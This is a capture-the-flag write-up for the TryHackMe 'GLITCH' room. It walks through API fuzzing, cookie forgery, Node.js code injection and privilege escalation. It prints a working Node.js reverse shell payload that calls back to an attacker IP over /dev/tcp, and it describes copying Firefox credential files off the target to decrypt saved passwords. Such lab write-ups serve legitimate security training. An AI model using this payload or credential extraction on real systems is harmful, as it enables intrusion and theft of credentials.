# THM: GLITCH
**Difficulty:** Easy
**Focus:** API Enumeration, Cookie Manipulation, Node.js RCE (Remote Code Execution), Firefox Profile Decryption

---

## 🛡️ Executive Summary
GLITCH is a modern web-based challenge that focuses on API exploitation and Node.js vulnerabilities. The attack path involves identifying an unsecured API endpoint, manipulating client-side storage (Cookies) to gain access to a "restricted" dashboard, and finally exploiting a Node.js vulnerability to achieve Remote Code Execution (RCE). Privilege escalation involves a unique path of decrypting stored browser credentials from a Firefox profile.

## 1. Reconnaissance & Enumeration
### Nmap Scan
The scan revealed only one port open:
* **80/http** - Node.js (Express framework)

### Web Analysis & API Fuzzing
The homepage is a simple "glitchy" interface with no obvious functionality. I used `ffuf` to discover hidden API endpoints:
`ffuf -u http://[IP]/FUZZ -w /usr/share/wordlists/dirb/common.txt`

**Discovery:**
* `/api/access` - This endpoint returned a JSON object containing an `access_token`.



## 2. Initial Access: Cookie Manipulation & RCE
I observed that the application checked for a specific cookie to grant access to the dashboard.

**Exploitation:**
1. I opened the browser **Developer Tools (F12)** and navigated to the **Storage** tab.
2. I manually added a cookie named `token` and assigned it the value found in the `/api/access` endpoint.
3. Refreshing the page allowed me to bypass the landing screen and access the dashboard.

### Achieving RCE (Node.js)
The dashboard contained a parameter that appeared to be passing data directly into a Node.js function. I tested for RCE by sending a payload designed to execute system commands.



**Exploitation Logic:**
I utilized a Node.js reverse shell payload to establish a connection back to my machine. By sending the following script through the vulnerable parameter, the server executed the command:

`require("child_process").spawn("/bin/sh", ["-c", "bash -i >& /dev/tcp/YOUR_IP/4444 0>&1"])`

After sending the request, I received a reverse shell on my Netcat listener.

**Flag Captured:** `user.txt`

## 3. Privilege Escalation: Firefox Profile Decryption
During local enumeration, I found a hidden `.firefox` directory in the user's home folder. This suggested that sensitive credentials might be stored in the browser's profile.

**The Strategy:**
1. I transferred the `logins.json` and `key4.db` files from the target machine to my attack machine.
2. I used the **firefox_decrypt** utility to extract the stored passwords.



**Result:**
The tool successfully decrypted a password used for the user `v0id`.

### Final Escalation
I switched to the `v0id` user using the discovered password. Checking `sudo -l` revealed that `v0id` had permission to run a specific binary as root, allowing me to fully compromise the system and capture the final flag.

---
**Flag Captured:** `root.txt`
